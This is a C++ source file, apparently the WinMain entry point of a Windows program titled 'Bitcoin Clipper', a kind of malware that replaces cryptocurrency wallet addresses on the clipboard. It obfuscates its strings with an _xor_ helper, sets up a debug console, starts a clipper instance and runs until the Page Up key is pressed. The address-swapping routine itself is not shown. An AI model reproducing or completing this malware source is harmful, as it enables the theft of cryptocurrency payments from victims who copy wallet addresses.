#include "imports.hpp"

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR szCmdLine, int iCmdShow)
{
#ifdef _DEBUG
	AllocConsole();

	HWND console_hwnd = GetConsoleWindow();
	RECT console_bound = { 900, 420 };
	RECT window_rect;

	SetConsoleTitle(_xor_("Bitcoin Clipper - DEBUG").c_str());

	GetWindowRect(console_hwnd, &window_rect);
	MoveWindow(console_hwnd, window_rect.left, window_rect.top, console_bound.left, console_bound.top, true);

	SetWindowLong(console_hwnd, GWL_STYLE, GetWindowLong(console_hwnd, GWL_STYLE) | WS_BORDER);
	SetWindowLong(console_hwnd, GWL_EXSTYLE, GetWindowLong(console_hwnd, GWL_EXSTYLE) | WS_EX_LAYERED);

	SetLayeredWindowAttributes(console_hwnd, 0, 230, 2);

	freopen_s((FILE**)stdout, _xor_("CONOUT$").c_str(), "w", stdout);
#endif

	c_clipper::instance()->start();

	while (true)
	{
		if (GetAsyncKeyState(VK_PRIOR) & 0x8000)
			break;

		std::this_thread::sleep_for(std::chrono::milliseconds(10));
		std::this_thread::yield();
	}

	c_clipper::instance()->shutdown();
	exit(0);
}